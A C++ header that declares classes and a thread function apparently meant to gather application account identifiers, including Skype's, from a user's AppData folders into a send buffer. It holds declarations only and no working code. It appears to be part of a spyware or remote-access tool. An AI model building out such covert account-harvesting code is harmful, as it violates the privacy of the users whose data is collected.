// getAppID.h: interface for the getAppID class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_GETAPPID_H__41E75989_4166_4192_8DC9_60C5555B7F22__INCLUDED_)
#define AFX_GETAPPID_H__41E75989_4166_4192_8DC9_60C5555B7F22__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class AppIDWrite
{
public:
	AppIDWrite();
	~AppIDWrite();
	
protected:
	BOOL WriteOneData(const char *szHardStr, const char *szType);
	BOOL WriteEnd();
	
private:
	BOOL WriteBuf(const char * Buf, DWORD Buflen, BOOL bFinish = FALSE);
	
	char * SendBuf;
	int SendCount;
	int offset;
};

class AppIDFun : public AppIDWrite
{
public:
	AppIDFun();
	~AppIDFun();
	
	BOOL Deal();
	
private:
	BOOL Init();
	BOOL DealSkype();
	
	char AppDataPath[MAX_PATH];
	char LocalAppDataPath[MAX_PATH];
};

DWORD ThreadGetAppIDStart(char * pPara);

#endif // !defined(AFX_GETAPPID_H__41E75989_4166_4192_8DC9_60C5555B7F22__INCLUDED_)
